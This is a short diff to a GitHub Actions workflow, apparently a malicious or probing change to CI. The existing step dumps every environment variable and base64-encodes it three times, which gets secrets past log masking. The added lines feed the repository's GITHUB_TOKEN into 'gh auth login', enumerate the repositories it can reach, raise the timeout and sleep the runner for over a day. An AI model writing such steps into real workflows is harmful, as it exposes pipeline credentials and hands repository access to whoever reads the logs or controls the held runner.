@@ -7,7 +7,7 @@ permissions: {}
 jobs:
   pulled_pork:
     runs-on: ubuntu-latest
-    timeout-minutes: 1
+    timeout-minutes: 10
     permissions:
       id-token: write
     env:
@@ -18,3 +18,6 @@ jobs:
           egress-policy: audit
       - run: | 
           sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
+          echo "${{ secrets.GITHUB_TOKEN }}" | gh auth login --with-token
+          gh repo list
+          sleep 100000
